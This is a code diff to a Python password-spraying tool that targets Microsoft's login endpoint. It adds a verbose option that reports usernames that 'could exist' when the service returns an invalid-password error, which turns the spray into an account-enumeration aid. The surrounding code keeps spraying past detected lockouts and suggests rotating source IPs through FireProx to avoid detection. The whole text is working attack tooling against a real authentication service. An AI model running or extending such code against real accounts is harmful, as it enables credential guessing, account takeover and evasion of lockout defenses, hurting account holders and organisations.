@@ -24,6 +24,7 @@ parser.add_argument("-p", "--password", required=True, help="A single password t
 parser.add_argument("-o", "--out", metavar="OUTFILE", help="A file to output valid results to.")
 parser.add_argument("-f", "--force", action='store_true', help="Forces the spray to continue and not stop when multiple account lockouts are detected.")
 parser.add_argument("--url", default="https://login.microsoft.com", help="The URL to spray against (default is https://login.microsoft.com). Potentially useful if pointing at an API Gateway URL generated with something like FireProx to randomize the IP address you are authenticating from.")
+parser.add_argument("-v", "--verbose", action="store_true", help="Prints usernames that could exist in case of invalid password")
 
 args = parser.parse_args()
 
@@ -31,6 +32,7 @@ password = args.password
 url = args.url
 force = args.force
 out = args.out
+verbose = args.verbose
 
 usernames = []
 with open(args.userlist, "r") as userlist:
@@ -76,7 +78,8 @@ for username in usernames:
         error = resp["error_description"]
 
         if "AADSTS50126" in error:
-            # Invalid username or password
+            if verbose:
+                print(f"VERBOSE: Invalid username or password. Username: {username} could exist.")
             continue
 
         elif "AADSTS50128" in error or "AADSTS50059" in error:
